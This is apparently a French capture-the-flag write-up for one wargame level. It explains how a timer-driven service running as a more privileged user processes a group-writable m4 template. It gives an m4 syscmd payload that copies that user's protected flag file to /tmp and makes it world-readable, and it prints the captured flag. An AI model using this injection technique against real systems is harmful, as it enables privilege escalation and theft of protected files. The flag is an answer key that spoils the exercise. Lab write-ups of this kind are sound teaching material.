# Level 04 → Level 05

**Mot de passe du niveau :** flag de `level03`

## Vulnérabilité
Même principe que le level03, mais via `babel` : un timer `babel.timer` (~30 s)
lance `babel.service` sous l'utilisateur `flag04`, qui traite un `template.m4`
situé dans un répertoire du groupe `babel` (dont on est membre), accessible en
écriture. `m4` permet l'exécution de commandes via la macro `syscmd()`.

## Exploitation
Déposer un `template.m4` dans le répertoire accessible :
```m4
syscmd(`cp /home/flag04/.flag /tmp/flaglol')dnl
syscmd(`chmod 777 /tmp/flaglol')dnl
```
Attendre le timer (~30 s) puis `cat /tmp/flaglol`.
Voir `ressource/exploit.sh`.

## Flag
```
ne2searoevaevoem4ov4ar8ap
```
